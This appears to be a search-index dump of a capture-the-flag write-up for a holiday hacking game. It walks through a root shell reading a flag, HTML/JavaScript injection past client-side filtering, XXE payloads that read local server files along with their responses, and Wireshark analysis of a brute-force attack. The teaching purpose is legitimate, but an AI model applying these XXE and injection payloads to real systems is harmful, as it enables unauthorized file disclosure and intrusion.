/etc/gitlab-runner/hhc22-wordpress-deploy root@wordpress.flag.net.internal Linux wordpress.flag.net.internal 5.10.51 #1 SMP Mon Jul 19 19:08:01 UTC 2021 x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. whoami root ls pwd /root ls cd .. ls bin boot dev etc flag.txt home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var ``` read flag.txt to obtain the required flag. oI40zIuCcN8c3MhKgQjOMN8lfYtVqcKT","title":"Terminal"},{"location":"2.%20Recover%20the%20Elfen%20Ring/3.%20Jolly%20CI-CD/#rejoice","text":"How unexpected, you were actually able to help! Well, then I must apoligize for my dubious greeting. Us Flobbits can't help it sometimes, it's just in our nature. Right then, there are other Flobbits that need assistance further into the burrows. Thank you, and off you go.","title":"Rejoice"},{"location":"2.%20Recover%20the%20Elfen%20Ring/3.%20Jolly%20CI-CD/#chat-with-grinchum","text":"\ud83d\ude16 A second Precious is gone! Now we only have three. \ud83e\udd28 Why are you humanses nagging us? We are busy. grinchum..grinchum You want to know about us? If we tell the naggy human, will it go away? Fine... \ud83e\udd7a The jolly human and the elfses locked up the Preciouses, but I freed them all, and together we escaped. We fled, and we were so alone. We soon forgot the taste of Lembanh, the softness of snowflakes falling, even our name. And we only wanted to eat raw fish: nigiri, maki, or shashimi. But we most likes gnawing the whole, living fish, so juicy sweet. Then we saw the Sporcses, and they wanted my Preciouses all to themselves. And the humanses came, but they just want coinses for their silly hats. We only meant to protect you, Preciouses, from the naughty Elfses and Flobbitses and Sporcses, so we locked you away. \ud83d\ude0f Now leave us alone, naggy human, we must find the two missing Preciouses.","title":"Chat with Grinchum"},{"location":"2.%20Recover%20the%20Elfen%20Ring/3.%20Jolly%20CI-CD/#find-the-next-objective","text":"Onto the Web Ring!","title":"Find the Next Objective"},{"location":"3.%20Recover%20the%20Web%20Ring/2.%20Open%20Boria%20Mine%20Door/","text":"Open the door to the Boria Mines. Help Alabaster Snowball in the Web Ring to get some hints for this challenge. Difficulty: 3/5 Chat with Hal Tandybuck Oh hi, I'm Hal Tandybuck. And who might you be? I'm hanging out by the door to the mines here because, well, I haven't figured out the locks yet. It actually reminds me of this locked crate I had three years ago... I doubt we'll get much in the way of debug output. Think you can help me get through? Terminal First we read source code to figure out how the locks work so that we can open the door. Each pin is coded as a form within an iframe. When we click the go button, that will submit the form by generating a post request to the server. The idea is to connect the color sensors so that there is a continuous colour path from the input sensor to the output sensor. <div class=\"iframes\"> <iframe src=\"/pin1\" class=\"pin1 completed\"></iframe> <iframe src=\"/pin2\" class=\"pin2\"></iframe> <iframe src=\"/pin3\" class=\"pin3\"></iframe> <iframe src=\"/pin6\" class=\"pin6\"></iframe> <iframe src=\"/pin5\" class=\"pin5\"></iframe> <iframe src=\"/pin4\" class=\"pin4\"></iframe> <img class=\"wiring\" src=\"wiring.png\"> <canvas class=\"effects\" width=\"744\" height=\"422\"></canvas> <button class=\"helpBtn\">?</button> </div> pin1: Looking at the source code for pin 1 we see the answer within a comment. <form method=\"post\" action=\"pin1\"> <!-- @&@&&W&&W&&&& --> <input class=\"inputTxt\" name=\"inputTxt\" type=\"text\" value=\"\" autocomplete=\"off\"> <button>GO</button> </form> @&@&&W&&W&&&& pin2: Looking at the comment in the form we get a clue that the input may not filter out HTML. <form method=\"post\" action=\"pin2\"> <!-- TODO: FILTER OUT HTML FROM USER INPUT --> <input class=\"inputTxt\" name=\"inputTxt\" type=\"text\" value=\"\" autocomplete=\"off\"> <button>GO</button> </form> ``` As both the input and output sensors are white let's attempt to fill the pin with white color. `<style>body {background-color: white;}</style>` ![](../images/web_ring/pin2_after.gif) pin3: ![](../images/web_ring/pin3_before.png) Looking at the comment in the form we get a clue that the input may not filter out javascript. GO As both the input and output sensors are blue let's attempt to fill the pin with blue color using JS. `<script>document.querySelector(\"body\").style.cssText = \"background-color:blue\"</script>` ![](../images/web_ring/pin3_after.gif) pin4: ![](../images/web_ring/pin4_before.png) GO const sanitizeInput = () => { const input = document.querySelector('.inputTxt'); const content = input.value; input.value = content .replace(/\"/, '') .replace(/'/, '') .replace(/ /, ''); } As the sanitization happens on the client side, it can be easily disabled from the browser itself from the Event Listeners tab: ![](../images/web_ring/remove_blur.png) Remove blur event listener on input element and submit the following HTML. As HTML sanitization doesn't happen at the server end either, the code is executed as is. ![](../images/web_ring/pin4_after.gif) pin5: ![](../images/web_ring/pin5_before.png) Similar to pin4, remove the event listener on blur and submit the following JS. As JS sanitization doesn't happen at the server end either, the code is executed as is. bod = document.querySelector(\"body\"); bod.style.cssText = \"background-color:red\"; new_div = document.createElement(\"div\"); new_div.style.cssText = \"height: 120px;width: 200px;background-color:blue;margin-left: 20px;margin-top: 100px;\"; bod.append(new_div); ![](../images/web_ring/pin5_after.gif) pin6: ![](../images/web_ring/pin6_before.png) After a lot of fiddling around with the filter on this one I realised that some HTML and JS input validation was present but the img HTML element did not seem to be filtered. In particular image [data urls](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URLs) were allowed! In fact, most of the pins did not filter the img element with data URL as source: ![cats](../images/web_ring/cats.png) To solve pin6 we need green, red and blue colored images which I picked up from wikimedia commons. > Red <img src=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAOEAAADhCAMAAAAJbSJIAAAAA1BMVEX/AAAZ4gk3AAAASElEQVR4nO3BgQAAAADDoPlTX+AIVQEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADwDcaiAAFXD1ujAAAAAElFTkSuQmCC\"> > Blue <img src=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAOEAAADhCAMAAAAJbSJIAAAAA1BMVEUAAP+KeNJXAAAASElEQVR4nO3BgQAAAADDoPlTX+AIVQEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADwDcaiAAFXD1ujAAAAAElFTkSuQmCC\"> >Green <img src=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAOEAAADhCAMAAAAJbSJIAAAAA1BMVEUA/wA0XsCoAAAASElEQVR4nO3BgQAAAADDoPlTX+AIVQEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADwDcaiAAFXD1ujAAAAAElFTkSuQmCC\"> > Putting it all together ``` Rejoice Wha - what?? You opened all the locks?! Well then... Did you see the nearby terminal with evidence of an XXE attack? Maybe take a close look at that kind of thing.","title":"2. Open Boria Mine Door"},{"location":"3.%20Recover%20the%20Web%20Ring/2.%20Open%20Boria%20Mine%20Door/#chat-with-hal-tandybuck","text":"Oh hi, I'm Hal Tandybuck. And who might you be? I'm hanging out by the door to the mines here because, well, I haven't figured out the locks yet. It actually reminds me of this locked crate I had three years ago... I doubt we'll get much in the way of debug output. Think you can help me get through?","title":"Chat with Hal Tandybuck"},{"location":"3.%20Recover%20the%20Web%20Ring/2.%20Open%20Boria%20Mine%20Door/#terminal","text":"First we read source code to figure out how the locks work so that we can open the door. Each pin is coded as a form within an iframe. When we click the go button, that will submit the form by generating a post request to the server. The idea is to connect the color sensors so that there is a continuous colour path from the input sensor to the output sensor. <div class=\"iframes\"> <iframe src=\"/pin1\" class=\"pin1 completed\"></iframe> <iframe src=\"/pin2\" class=\"pin2\"></iframe> <iframe src=\"/pin3\" class=\"pin3\"></iframe> <iframe src=\"/pin6\" class=\"pin6\"></iframe> <iframe src=\"/pin5\" class=\"pin5\"></iframe> <iframe src=\"/pin4\" class=\"pin4\"></iframe> <img class=\"wiring\" src=\"wiring.png\"> <canvas class=\"effects\" width=\"744\" height=\"422\"></canvas> <button class=\"helpBtn\">?</button> </div> pin1: Looking at the source code for pin 1 we see the answer within a comment. <form method=\"post\" action=\"pin1\"> <!-- @&@&&W&&W&&&& --> <input class=\"inputTxt\" name=\"inputTxt\" type=\"text\" value=\"\" autocomplete=\"off\"> <button>GO</button> </form> @&@&&W&&W&&&& pin2: Looking at the comment in the form we get a clue that the input may not filter out HTML. <form method=\"post\" action=\"pin2\"> <!-- TODO: FILTER OUT HTML FROM USER INPUT --> <input class=\"inputTxt\" name=\"inputTxt\" type=\"text\" value=\"\" autocomplete=\"off\"> <button>GO</button> </form> ``` As both the input and output sensors are white let's attempt to fill the pin with white color. `<style>body {background-color: white;}</style>` ![](../images/web_ring/pin2_after.gif) pin3: ![](../images/web_ring/pin3_before.png) Looking at the comment in the form we get a clue that the input may not filter out javascript. GO As both the input and output sensors are blue let's attempt to fill the pin with blue color using JS. `<script>document.querySelector(\"body\").style.cssText = \"background-color:blue\"</script>` ![](../images/web_ring/pin3_after.gif) pin4: ![](../images/web_ring/pin4_before.png) GO const sanitizeInput = () => { const input = document.querySelector('.inputTxt'); const content = input.value; input.value = content .replace(/\"/, '') .replace(/'/, '') .replace(/ /, ''); } As the sanitization happens on the client side, it can be easily disabled from the browser itself from the Event Listeners tab: ![](../images/web_ring/remove_blur.png) Remove blur event listener on input element and submit the following HTML. As HTML sanitization doesn't happen at the server end either, the code is executed as is. ![](../images/web_ring/pin4_after.gif) pin5: ![](../images/web_ring/pin5_before.png) Similar to pin4, remove the event listener on blur and submit the following JS. As JS sanitization doesn't happen at the server end either, the code is executed as is. bod = document.querySelector(\"body\"); bod.style.cssText = \"background-color:red\"; new_div = document.createElement(\"div\"); new_div.style.cssText = \"height: 120px;width: 200px;background-color:blue;margin-left: 20px;margin-top: 100px;\"; bod.append(new_div); ![](../images/web_ring/pin5_after.gif) pin6: ![](../images/web_ring/pin6_before.png) After a lot of fiddling around with the filter on this one I realised that some HTML and JS input validation was present but the img HTML element did not seem to be filtered. In particular image [data urls](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URLs) were allowed! In fact, most of the pins did not filter the img element with data URL as source: ![cats](../images/web_ring/cats.png) To solve pin6 we need green, red and blue colored images which I picked up from wikimedia commons. > Red <img src=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAOEAAADhCAMAAAAJbSJIAAAAA1BMVEX/AAAZ4gk3AAAASElEQVR4nO3BgQAAAADDoPlTX+AIVQEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADwDcaiAAFXD1ujAAAAAElFTkSuQmCC\"> > Blue <img src=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAOEAAADhCAMAAAAJbSJIAAAAA1BMVEUAAP+KeNJXAAAASElEQVR4nO3BgQAAAADDoPlTX+AIVQEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADwDcaiAAFXD1ujAAAAAElFTkSuQmCC\"> >Green <img src=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAOEAAADhCAMAAAAJbSJIAAAAA1BMVEUA/wA0XsCoAAAASElEQVR4nO3BgQAAAADDoPlTX+AIVQEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADwDcaiAAFXD1ujAAAAAElFTkSuQmCC\"> > Putting it all together ```","title":"Terminal"},{"location":"3.%20Recover%20the%20Web%20Ring/2.%20Open%20Boria%20Mine%20Door/#rejoice","text":"Wha - what?? You opened all the locks?! Well then... Did you see the nearby terminal with evidence of an XXE attack? Maybe take a close look at that kind of thing.","title":"Rejoice"},{"location":"3.%20Recover%20the%20Web%20Ring/3.%20Glamtariel%27s%20Fountain/","text":"Stare into Glamtariel's fountain and see if you can find the ring! What is the filename of the ring she presents you? Talk to Hal Tandybuck in the Web Ring for hints. Difficulty: 5/5 Chat with Fitzy Akbowl Huh - what? Why do you disturb Akbowl? I'm trying to get the ring in here for the Sporc Chief. Unlucky for me it's lost in this water basin thing. You will not get it out before Akbowl! Terminal Discover something Glamtariel has never revealed What is the filename of the ring she presents you? Whenever we drop an object on either the princess or the fountain we see JSON requests getting triggered which look like this: {\"imgDrop\":\"img1\",\"who\":\"princess\",\"reqType\":\"json\"} HINT: Sometimes we can hit web pages with XXE when they aren't expecting it! let's convert the JSON request to an XML request and try sending this modified request. <?xml version=\"1.0\" encoding=\"UTF-8\" ?> <root> <imgDrop>img1</imgDrop> <who>princess</who> <reqType>xml</reqType> </root> Remember to change the content-type of the request too! On sending this request, we get the following response. { \"appResp\": \"I love rings of all colors!^She definitely tries to convince everyone that the blue ones are her favorites. I'm not so sure though.\", \"droppedOn\": \"none\", \"visit\": \"none\" } We know to try XXE from the hint. Also based on the clues from the princess and the fountain we are looking for a ringlist.txt. After experimenting with locations to try XXE as well as guessing possible paths, the following request works and we get a differenct repsonse from the server. <?xml version=\"1.0\" encoding=\"UTF-8\" ?> <!DOCTYPE foo [<!ELEMENT foo ANY > <!ENTITY xxe SYSTEM \"file:///app/static/images/ringlist.txt\"> ]> <root> <imgDrop>&xxe;</imgDrop> <who>princess</who> <reqType>xml</reqType> </root> { \"appResp\": \"Ah, you found my ring list! Gold, red, blue - so many colors! Glad I don't keep any secrets in it any more! Please though, don't tell anyone about this.^She really does try to keep things safe. Best just to put it away. (click)\", \"droppedOn\": \"none\", \"visit\": \"static/images/pholder-morethantopsupersecret63842.png,262px,100px\" } The visit parameter in the response points to a URL. Let's visit that. await fetch(\"https://glamtarielsfountain.com/static/images/pholder-morethantopsupersecret63842.png\", { \"credentials\": \"include\", \"headers\": { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0\", \"Accept\": \"image/avif,image/webp,*/*\", \"Accept-Language\": \"en-US,en;q=0.5\", \"Sec-Fetch-Dest\": \"image\", \"Sec-Fetch-Mode\": \"no-cors\", \"Sec-Fetch-Site\": \"same-origin\", \"Pragma\": \"no-cache\", \"Cache-Control\": \"no-cache\" }, \"referrer\": \"https://glamtarielsfountain.com/\", \"method\": \"GET\", \"mode\": \"cors\" }); The image hints of the existence of a folder called x_phial_pholder_2022 within which reside files bluering.txt and redring.txt . Let's issue requests for these files. <?xml version=\"1.0\" encoding=\"UTF-8\" ?> <!DOCTYPE foo [<!ELEMENT foo ANY > <!ENTITY xxe SYSTEM \"file:///app/static/images/x_phial_pholder_2022/redring.txt\"> ]> <root> <imgDrop>&xxe;</imgDrop> <who>princess</who> ``` ``` { \"appResp\": \"Hmmm, you still seem awfully interested in these rings. I can't blame you, they are pretty nice.^Oooooh, I can just tell she'd like to talk about them some more.\", \"droppedOn\": \"none\", \"visit\": \"none\" } <?xml version=\"1.0\" encoding=\"UTF-8\" ?> <!DOCTYPE foo [<!ELEMENT foo ANY > <!ENTITY xxe SYSTEM \"file:///app/static/images/x_phial_pholder_2022/bluering.txt\"> ]> <root> <imgDrop>&xxe;</imgDrop> <who>princess</who> <reqType>xml</reqType> </root> { \"appResp\": \"I love these fancy blue rings! You can see we have two of them. Not magical or anything, just really pretty.^She definitely tries to convince everyone that the blue ones are her favorites. I'm not so sure though.\", \"droppedOn\": \"none\", \"visit\": \"none\" } Issue a request for silver ring too (just an intuituve guess). <?xml version=\"1.0\" encoding=\"UTF-8\" ?> <!DOCTYPE foo [<!ELEMENT foo ANY > <!ENTITY xxe SYSTEM \"file:///app/static/images/x_phial_pholder_2022/silverring.txt\"> ]> <root> <imgDrop>&xxe;</imgDrop> <who>princess</who> <reqType>xml</reqType> </root> { \"appResp\": \"I'd so love to add that silver ring to my collection, but what's this? Someone has defiled my red ring! Click it out of the way please!.^Can't say that looks good. Someone has been up to no good. Probably that miserable Grinchum!\", \"droppedOn\": \"none\", \"visit\": \"static/images/x_phial_pholder_2022/redring-supersupersecret928164.png,267px,127px\" } The visit parameter in the response points to a URL. Let's visit that. await fetch(\"https://glamtarielsfountain.com/static/images/x_phial_pholder_2022/redring-supersupersecret928164.png,267px,127px\", { \"credentials\": \"include\", \"headers\": { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0\", \"Accept\": \"image/avif,image/webp,*/*\", \"Accept-Language\": \"en-US,en;q=0.5\", \"Sec-Fetch-Dest\": \"image\", \"Sec-Fetch-Mode\": \"no-cors\", \"Sec-Fetch-Site\": \"same-origin\", \"Pragma\": \"no-cache\", \"Cache-Control\": \"no-cache\" }, \"referrer\": \"https://glamtarielsfountain.com/\", \"method\": \"GET\", \"mode\": \"cors\" }); On closer inspection we find that the writing on the ring says goldring_to_be_deleted.txt . Let's issue a request for this file. <?xml version=\"1.0\" encoding=\"UTF-8\" ?> <!DOCTYPE foo [<!ELEMENT foo ANY > <!ENTITY xxe SYSTEM \"file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt\"> ]> <root> <imgDrop>&xxe;</imgDrop> <who>princess</who> <reqType>xml</reqType> </root> { \"appResp\": \"Hmmm, and I thought you wanted me to take a look at that pretty silver ring, but instead, you've made a pretty bold REQuest. That's ok, but even if I knew anything about such things, I'd only use a secret TYPE of tongue to discuss them.^She's definitely hiding something.\", \"droppedOn\": \"none\", \"visit\": \"none\" } based on the REQYPE hint above, let's change the postion of the XXE to the reqtype element. Also let's drop the silver ring (img1). <?xml version=\"1.0\" encoding=\"UTF-8\" ?> <!DOCTYPE foo [<!ELEMENT foo ANY > <!ENTITY xxe SYSTEM \"file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt\"> ]> <root> <imgDrop>img1</imgDrop> <who>princess</who> <reqType>&xxe;</reqType> </root> { \"appResp\": \"No, really I couldn't. Really? I can have the beautiful silver ring? I shouldn't, but if you insist, I accept! In return, behold, one of Kringle's golden rings! Grinchum dropped this one nearby. Makes one wonder how 'precious' it really was to him. Though I haven't touched it myself, I've been keeping it safe until someone trustworthy such as yourself came along. Congratulations!^Wow, I have never seen that before! She must really trust you!\", \"droppedOn\": \"none\", \"visit\": \"static/images/x_phial_pholder_2022/goldring-morethansupertopsecret76394734.png,200px,290px\" } Issue a request to the URL in the visit parameter of the response to get the ring! Rejoice No! That's not yours! This birdbath showed me images of this happening. But I didn't believe it because nobody is better than Akbowl! Akbowl's head is the hardest! That's what the other sporcs tell me. I guess Akbowl's head is not the smartest. Chat with Grinchum \ud83d\ude0f First lost... second lost... third lost. \ud83d\ude1f Where are they? \ud83d\ude26 WHERE ARE THEY, preciouses? No! Aaargh! Lost! \ud83d\ude16 You - naggy human. Musn't bother us. \ud83d\ude31 Not its business! grinchum..grinchum","title":"3. Glamtariel's Fountain"},{"location":"3.%20Recover%20the%20Web%20Ring/3.%20Glamtariel%27s%20Fountain/#chat-with-fitzy-akbowl","text":"Huh - what? Why do you disturb Akbowl? I'm trying to get the ring in here for the Sporc Chief. Unlucky for me it's lost in this water basin thing. You will not get it out before Akbowl!","title":"Chat with Fitzy Akbowl"},{"location":"3.%20Recover%20the%20Web%20Ring/3.%20Glamtariel%27s%20Fountain/#terminal","text":"Discover something Glamtariel has never revealed What is the filename of the ring she presents you? Whenever we drop an object on either the princess or the fountain we see JSON requests getting triggered which look like this: {\"imgDrop\":\"img1\",\"who\":\"princess\",\"reqType\":\"json\"} HINT: Sometimes we can hit web pages with XXE when they aren't expecting it! let's convert the JSON request to an XML request and try sending this modified request. <?xml version=\"1.0\" encoding=\"UTF-8\" ?> <root> <imgDrop>img1</imgDrop> <who>princess</who> <reqType>xml</reqType> </root> Remember to change the content-type of the request too! On sending this request, we get the following response. { \"appResp\": \"I love rings of all colors!^She definitely tries to convince everyone that the blue ones are her favorites. I'm not so sure though.\", \"droppedOn\": \"none\", \"visit\": \"none\" } We know to try XXE from the hint. Also based on the clues from the princess and the fountain we are looking for a ringlist.txt. After experimenting with locations to try XXE as well as guessing possible paths, the following request works and we get a differenct repsonse from the server. <?xml version=\"1.0\" encoding=\"UTF-8\" ?> <!DOCTYPE foo [<!ELEMENT foo ANY > <!ENTITY xxe SYSTEM \"file:///app/static/images/ringlist.txt\"> ]> <root> <imgDrop>&xxe;</imgDrop> <who>princess</who> <reqType>xml</reqType> </root> { \"appResp\": \"Ah, you found my ring list! Gold, red, blue - so many colors! Glad I don't keep any secrets in it any more! Please though, don't tell anyone about this.^She really does try to keep things safe. Best just to put it away. (click)\", \"droppedOn\": \"none\", \"visit\": \"static/images/pholder-morethantopsupersecret63842.png,262px,100px\" } The visit parameter in the response points to a URL. Let's visit that. await fetch(\"https://glamtarielsfountain.com/static/images/pholder-morethantopsupersecret63842.png\", { \"credentials\": \"include\", \"headers\": { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0\", \"Accept\": \"image/avif,image/webp,*/*\", \"Accept-Language\": \"en-US,en;q=0.5\", \"Sec-Fetch-Dest\": \"image\", \"Sec-Fetch-Mode\": \"no-cors\", \"Sec-Fetch-Site\": \"same-origin\", \"Pragma\": \"no-cache\", \"Cache-Control\": \"no-cache\" }, \"referrer\": \"https://glamtarielsfountain.com/\", \"method\": \"GET\", \"mode\": \"cors\" }); The image hints of the existence of a folder called x_phial_pholder_2022 within which reside files bluering.txt and redring.txt . Let's issue requests for these files. <?xml version=\"1.0\" encoding=\"UTF-8\" ?> <!DOCTYPE foo [<!ELEMENT foo ANY > <!ENTITY xxe SYSTEM \"file:///app/static/images/x_phial_pholder_2022/redring.txt\"> ]> <root> <imgDrop>&xxe;</imgDrop> <who>princess</who> ``` ``` { \"appResp\": \"Hmmm, you still seem awfully interested in these rings. I can't blame you, they are pretty nice.^Oooooh, I can just tell she'd like to talk about them some more.\", \"droppedOn\": \"none\", \"visit\": \"none\" } <?xml version=\"1.0\" encoding=\"UTF-8\" ?> <!DOCTYPE foo [<!ELEMENT foo ANY > <!ENTITY xxe SYSTEM \"file:///app/static/images/x_phial_pholder_2022/bluering.txt\"> ]> <root> <imgDrop>&xxe;</imgDrop> <who>princess</who> <reqType>xml</reqType> </root> { \"appResp\": \"I love these fancy blue rings! You can see we have two of them. Not magical or anything, just really pretty.^She definitely tries to convince everyone that the blue ones are her favorites. I'm not so sure though.\", \"droppedOn\": \"none\", \"visit\": \"none\" } Issue a request for silver ring too (just an intuituve guess). <?xml version=\"1.0\" encoding=\"UTF-8\" ?> <!DOCTYPE foo [<!ELEMENT foo ANY > <!ENTITY xxe SYSTEM \"file:///app/static/images/x_phial_pholder_2022/silverring.txt\"> ]> <root> <imgDrop>&xxe;</imgDrop> <who>princess</who> <reqType>xml</reqType> </root> { \"appResp\": \"I'd so love to add that silver ring to my collection, but what's this? Someone has defiled my red ring! Click it out of the way please!.^Can't say that looks good. Someone has been up to no good. Probably that miserable Grinchum!\", \"droppedOn\": \"none\", \"visit\": \"static/images/x_phial_pholder_2022/redring-supersupersecret928164.png,267px,127px\" } The visit parameter in the response points to a URL. Let's visit that. await fetch(\"https://glamtarielsfountain.com/static/images/x_phial_pholder_2022/redring-supersupersecret928164.png,267px,127px\", { \"credentials\": \"include\", \"headers\": { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0\", \"Accept\": \"image/avif,image/webp,*/*\", \"Accept-Language\": \"en-US,en;q=0.5\", \"Sec-Fetch-Dest\": \"image\", \"Sec-Fetch-Mode\": \"no-cors\", \"Sec-Fetch-Site\": \"same-origin\", \"Pragma\": \"no-cache\", \"Cache-Control\": \"no-cache\" }, \"referrer\": \"https://glamtarielsfountain.com/\", \"method\": \"GET\", \"mode\": \"cors\" }); On closer inspection we find that the writing on the ring says goldring_to_be_deleted.txt . Let's issue a request for this file. <?xml version=\"1.0\" encoding=\"UTF-8\" ?> <!DOCTYPE foo [<!ELEMENT foo ANY > <!ENTITY xxe SYSTEM \"file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt\"> ]> <root> <imgDrop>&xxe;</imgDrop> <who>princess</who> <reqType>xml</reqType> </root> { \"appResp\": \"Hmmm, and I thought you wanted me to take a look at that pretty silver ring, but instead, you've made a pretty bold REQuest. That's ok, but even if I knew anything about such things, I'd only use a secret TYPE of tongue to discuss them.^She's definitely hiding something.\", \"droppedOn\": \"none\", \"visit\": \"none\" } based on the REQYPE hint above, let's change the postion of the XXE to the reqtype element. Also let's drop the silver ring (img1). <?xml version=\"1.0\" encoding=\"UTF-8\" ?> <!DOCTYPE foo [<!ELEMENT foo ANY > <!ENTITY xxe SYSTEM \"file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt\"> ]> <root> <imgDrop>img1</imgDrop> <who>princess</who> <reqType>&xxe;</reqType> </root> { \"appResp\": \"No, really I couldn't. Really? I can have the beautiful silver ring? I shouldn't, but if you insist, I accept! In return, behold, one of Kringle's golden rings! Grinchum dropped this one nearby. Makes one wonder how 'precious' it really was to him. Though I haven't touched it myself, I've been keeping it safe until someone trustworthy such as yourself came along. Congratulations!^Wow, I have never seen that before! She must really trust you!\", \"droppedOn\": \"none\", \"visit\": \"static/images/x_phial_pholder_2022/goldring-morethansupertopsecret76394734.png,200px,290px\" } Issue a request to the URL in the visit parameter of the response to get the ring!","title":"Terminal"},{"location":"3.%20Recover%20the%20Web%20Ring/3.%20Glamtariel%27s%20Fountain/#rejoice","text":"No! That's not yours! This birdbath showed me images of this happening. But I didn't believe it because nobody is better than Akbowl! Akbowl's head is the hardest! That's what the other sporcs tell me. I guess Akbowl's head is not the smartest.","title":"Rejoice"},{"location":"3.%20Recover%20the%20Web%20Ring/3.%20Glamtariel%27s%20Fountain/#chat-with-grinchum","text":"\ud83d\ude0f First lost... second lost... third lost. \ud83d\ude1f Where are they? \ud83d\ude26 WHERE ARE THEY, preciouses? No! Aaargh! Lost! \ud83d\ude16 You - naggy human. Musn't bother us. \ud83d\ude31 Not its business! grinchum..grinchum","title":"Chat with Grinchum"},{"location":"3.%20Recover%20the%20Web%20Ring/1.%20Boria%20PCAP%20Mining/1.%20Naughty%20IP/","text":"Use the artifacts from Alabaster Snowball to analyze this attack on the Boria mines. Most of the traffic to this site is nice, but one IP address is being naughty! Which is it? Visit Sparkle Redberry in the Web Ring for hints. Difficulty: 1/5 Chat with Alabaster Snowball Hey there! I'm Alabaster Snowball And I have to say, I'm a bit distressed. I was working with the dwarves and their Boria mines, and I found some disturbing activity! Looking through these artifacts, I think something naughty's going on. Can you please take a look and answer a few questions for me? First, we need to know where the attacker is coming from. If you haven't looked at Wireshark's Statistics menu, this might be a good time! Terminal Find the naughty IP address wireshark stats menu The victim web server is 10.12.42.16 next top talker hint: top talker From the hint: You need to go to statistics>conversations . Click on conversations and you will see following window popping up. Click on Ipv4 and then click on Bytes to sort the flow with number of bytes and you are done!! 18.222.86.32 Rejoice Aha, you found the naughty actor! Next, please look into the account brute force attack. You can focus on requests to /login.html~","title":"1. Naughty IP"},{"location":"3.%20Recover%20the%20Web%20Ring/1.%20Boria%20PCAP%20Mining/1.%20Naughty%20IP/#chat-with-alabaster-snowball","text":"Hey there! I'm Alabaster Snowball And I have to say, I'm a bit distressed. I was working with the dwarves and their Boria mines, and I found some disturbing activity! Looking through these artifacts, I think something naughty's going on. Can you please take a look and answer a few questions for me? First, we need to know where the attacker is coming from. If you haven't looked at Wireshark's Statistics menu, this might be a good time!","title":"Chat with Alabaster Snowball"},{"location":"3.%20Recover%20the%20Web%20Ring/1.%20Boria%20PCAP%20Mining/1.%20Naughty%20IP/#terminal","text":"Find the naughty IP address wireshark stats menu The victim web server is 10.12.42.16 next top talker hint: top talker From the hint: You need to go to statistics>conversations . Click on conversations and you will see following window popping up. Click on Ipv4 and then click on Bytes to sort the flow with number of bytes and you are done!! 18.222.86.32","title":"Terminal"},{"location":"3.%20Recover%20the%20Web%20Ring/1.%20Boria%20PCAP%20Mining/1.%20Naughty%20IP/#rejoice","text":"Aha, you found the naughty actor! Next, please look into the account brute force attack. You can focus on requests to /login.html~","title":"Rejoice"},{"location":"3.%20Recover%20the%20Web%20Ring/1.%20Boria%20PCAP%20Mining/2.%20Credential%20Mining/","text":"The first attack is a brute force login. What's the first username tried? Difficulty: 1/5 Chat with Alabaster Snowball Aha, you found the naughty actor! Next, please look into the account brute force attack. You can focus on requests to /login.html~ Terminal What's the first username tried in the bruteforce attack? hint: search for strings in packets Use the following display filer: ip.src == 18.222.86.32 && ip.dst == 10.12.42.16 && http Also in the find packet toolbar search for \"login.html\". Inspect the first packet details: HTML Form URL Encoded: application/x-www-form-urlencoded Form item: \"username\" = \"alice\" Form item: \"password\" = \"philip\" Rejoice Alice? I totally expected Eve! Well how about forced browsing? What's the first URL path they found that way? The misses will have HTTP status code 404 and, in this case, the successful guesses return 200.","title":"2. Credential Mining"},{"location":"3.%20Recover%20the%20Web%20Ring/1.%20Boria%20PCAP%20Mining/2.%20Credential%20Mining/#chat-with-alabaster-snowball","text":"Aha, you found the naughty actor! Next, please look into the account brute force attack. You can focus on requests to /login.html~","title":"Chat with Alabaster Snowball"},{"location":"3.%20Recover%20the%20Web%20Ring/1.%20Boria%20PCAP%20Mining/2.%20Credential%20Mining/#terminal","text":"What's the first username tried in the bruteforce attack? hint: search for strings in packets Use the following display filer: ip.src == 18.222.86.32 && ip.dst == 10.12.42.16 && http Also in the find packet toolbar search for \"login.html\". Inspect the first packet details: HTML Form URL Encoded: application/x-www-form-urlencoded Form item: \"username\" = \"alice\" Form item: \"password\" = \"philip\"","title":"Terminal"},{"location":"3.%20Recover%20the%20Web%20Ring/1.%20Boria%20PCAP%20Mining/2.%20Credential%20Mining/#rejoice","text":"Alice? I totally expected Eve! Well how about forced browsing? What's the first URL path they found that way? The misses will have HTTP status code 404 and, in this case, the successful guesses return 